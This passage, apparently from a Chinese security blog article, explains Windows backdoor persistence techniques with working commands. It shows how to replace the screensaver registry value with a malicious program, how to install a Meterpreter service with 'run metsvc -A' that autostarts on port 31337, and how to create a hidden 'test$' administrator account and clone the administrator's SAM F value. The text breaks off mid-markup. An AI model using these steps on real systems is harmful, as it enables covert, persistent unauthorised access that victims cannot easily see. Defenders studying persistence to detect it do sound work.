style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: 0px;left: 0px;right: 0px;bottom: 0px;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">效果如下<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.573810994441013" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/13_NzG53BE64448G5mL2uvAkF6WNfroKQ.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgwOM1zMoj4hltibGl3EIYmLPMiaNzG53BE64448G5mL2uvAkF6WNfroKQ/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">屏幕保护程序</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的</span><br  /><span style="font-size:15px;line-height:35px;;">其中屏幕保护的配置存储在注册表中，其位置为：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">HKEY_CURRENT_USER\Control Panel\Desktop</span></code><span style="font-size:15px;line-height:35px;;">，关键键值如下：</span></p><ol style="" class=" list-paddingleft-2"><li><p style="margin-top: 16px;margin-bottom: 24px;"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">SCRNSAVE.EXE</span></code><span style="font-size:15px;line-height:35px;;">&nbsp;- 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序</span></p></li><li><p style="margin-top: 16px;margin-bottom: 24px;"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">ScreenSaveActive</span></code><span style="font-size:15px;line-height:35px;;">&nbsp;- 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态</span></p></li><li><p style="margin-top: 16px;margin-bottom: 24px;"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">ScreenSaverTimeout</span></code><span style="font-size:15px;line-height:35px;;">&nbsp;- 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</span></p></li></ol><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">设置如下：<br  /><img class="" data-ratio="0.40854149879129736" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/14_WMb0cT2vUS5e2kiaglrKeaYSsQaR5A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUg8Ekh0Zib2QpUDysowQY4AJQQYvWMb0cT2vUS5e2kiaglrKeaYSsQaR5A/640?wx_fmt=png'" data-type="png" data-w="1241" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: 0px;left: 0px;right: 0px;bottom: 0px;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">效果图：</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5498366013071896" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/15_o7mjtUUygiaQ7lXPpmEPc3gUkcSnPg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUg7g1NHO6PswAHbia5zVnRd2quQ9o7mjtUUygiaQ7lXPpmEPc3gUkcSnPg/640?wx_fmt=png'" data-type="png" data-w="1224"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">自启动服务</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">exe</code>文件注册为服务，也可以将<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">dll</code>文件注册为服务</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">为了方便起见我们可以直接用<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Metasploit</code>来注册一个服务</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;word-break: normal;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;">meterpreter &gt; run metsvc -A<br  /></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.27161572052401745" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/16_zXgQQRghOicicjTBrngsp2NkbWF9Aw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgUWwKSJpK0Oaia9hiaosfBQF6nf9OzXgQQRghOicicjTBrngsp2NkbWF9Aw/640?wx_fmt=png'" data-type="png" data-w="1145"  />运行之后msf会在<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">%TMP%</code>目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">metsvc.dll</code>、<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">metsvc-server.exe</code>、<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">metsvc.exe</code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.2812834224598931" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/17_Qz5X7Ero1yn7TITRdiboxXUeQAN3wg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgUHqhptibibVlM5iazmbVSRzFJUqxQz5X7Ero1yn7TITRdiboxXUeQAN3wg/640?wx_fmt=png'" data-type="png" data-w="935" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;display: block;padding-top: 10px;padding-bottom: 10px;top: 0px;left: 0px;right: 0px;bottom: 0px;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">同时会新建一个服务，其显示名称为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Meterpreter</code>，服务名称为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">metsvc</code>，启动类型为"自动"，默认绑定在31337端口。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.849507735583685" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/18_WnVUdwhpEK8ibCP9zolnF99rsHX3hg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgHk4BoAYfqbecufMU3tssnEuQAWnVUdwhpEK8ibCP9zolnF99rsHX3hg/640?wx_fmt=png'" data-type="png" data-w="711" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: 0px;left: 0px;right: 0px;bottom: 0px;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.22214627477785373" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/19_k7Hc2vmficIF3FhWg0bmrSqM2d7Jrw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgFfPGT0uNCn6uoNibKf7rEoOYdtk7Hc2vmficIF3FhWg0bmrSqM2d7Jrw/640?wx_fmt=png'" data-type="png" data-w="1463" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: 0px;left: 0px;right: 0px;bottom: 0px;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">如果想删除服务，可以执行</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;word-break: normal;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;">meterpreter &gt; run metsvc -r</pre><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">影子用户</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在用户名后面加一个<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">$</code>可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">net user test$ test /add<br  />net localgroup administrators test$ /add</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">可以看到<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">net user</code>是看不到我们创建的用户，但是计算机管理-用户和组中可以看到</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.542156862745098" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/20_HLUmNdhoxXyiaAsN36dbTz7dIuNuZw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgIxAr0G2DfuJPia9nsQmMaxB22RHLUmNdhoxXyiaAsN36dbTz7dIuNuZw/640?wx_fmt=png'" data-type="png" data-w="1020"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">所以这时候我们就需要修改一下注册表，其键位置为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">注意：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">SAM</code>键值默认是只能<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">system</code>权限修改的，所以我们要修改一下<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">SAM</code>键的权限，给予<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">administrator</code>完全控制和读取的权限</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="1.0617977528089888" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/21_JYFBya0KblomSSbdgjibwIfDTo9QUg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgbIicbnibkOKib2lKcEhzNmXdyLaRJYFBya0KblomSSbdgjibwIfDTo9QUg/640?wx_fmt=png'" data-type="png" data-w="534" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px 19.8295px 0px 19.8153px;display: block;padding-top: 10px;padding-bottom: 10px;top: 0px;left: 0px;right: 0px;bottom: 0px;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后我们将<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">administrator</code>用户对应的项中的F值复制到<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">test$</code>对应xiang中的F值，然后保存</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.6862170087976539" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/22_eXwnwFaBO5FqLMw6s90SXwxvKsZNVA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgMvado2IaRReHAcHBs5lo7XmEeXwnwFaBO5FqLMw6s90SXwxvKsZNVA/640?wx_fmt=png'" data-type="png" data-w="1023"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后我们将<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation 